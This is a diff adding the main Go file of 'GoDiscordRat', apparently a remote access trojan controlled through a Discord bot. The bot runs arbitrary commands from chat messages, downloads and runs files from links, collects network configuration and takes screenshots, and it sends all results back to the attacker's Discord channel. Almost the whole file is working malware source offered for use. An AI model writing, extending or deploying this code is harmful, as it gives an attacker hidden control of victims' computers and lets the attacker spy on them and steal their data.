@@ -1,0 +1,103 @@
+package main
+
+import (
+	"github.com/bwmarrin/discordgo"
+	"discordrat/utils"
+	"strings"
+)
+
+var token string = ""
+
+var helpEmbed = &discordgo.MessageEmbed{
+	Title: "GoDiscordRat - Help Menu - github.com/latepatches",
+	Description: "```\n.help < shows this message\n.screenshot < takes a screenshot\n.exec (cmd) < executes a command\n.run (file link) < runs a file```",
+}
+
+func onlaunch() {
+	sess, err := discordgo.New("Bot " + token)
+	sess.Identify.Intents = discordgo.IntentsAll
+	if err != nil {
+		return
+	}
+
+	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
+		if m.Author.Bot {
+			return
+		}
+
+		if strings.HasPrefix(m.Content, ".") {
+			if strings.HasPrefix(m.Content, ".run ") {
+				fixed := strings.TrimPrefix(m.Content, ".run ")
+				utils.RunFile(fixed)
+				s.ChannelMessageSend(m.ChannelID, "[+] File Ran")
+				return
+			}
+
+			if strings.HasPrefix(m.Content, ".exec ") {
+				fixed := strings.TrimPrefix(m.Content, ".exec ")
+				out := utils.ExecCommand(fixed)
+				s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
+					Title: "Command Executed - github.com/latepatches",
+					Description: "```\n" + out + "```",
+				})
+				return
+			}
+
+			if strings.HasPrefix(m.Content, ".ip") {
+				out := utils.ExecCommand("ipconfig")
+				s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
+					Title: "IP - github.com/latepatches",
+					Description: "```\n" + out + "```",
+				})
+				return
+			}
+
+			if strings.HasPrefix(m.Content, ".help") {
+				s.ChannelMessageSendEmbed(m.ChannelID, helpEmbed)
+				return
+			}
+
+			if strings.HasPrefix(m.Content, ".screenshot") {
+
+				out, err := utils.TakeSS()
+				if err != nil {
+				return
+				}
+				defer out.Close()
+				defer out.Close()
+
+				s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
+					Files: []*discordgo.File{
+						{
+							Name:   "screenshot.png",
+							Reader: out,
+						},
+					},
+					Embeds: []*discordgo.MessageEmbed{
+						{
+							Title: "Screenshot - github.com/latepatches",
+							Image: &discordgo.MessageEmbedImage{
+								URL: "attachment://screenshot.png",
+							},
+						},
+					},
+				})
+				return
+			}
+
+			s.ChannelMessageSend(m.ChannelID, "Command Not Found.")
+		}
+	})
+
+	if err := sess.Open(); err != nil {
+		return
+	}
+
+	defer sess.Close()
+	select {}
+}
+
+func main() {
+	go onlaunch()
+	select {}
+}
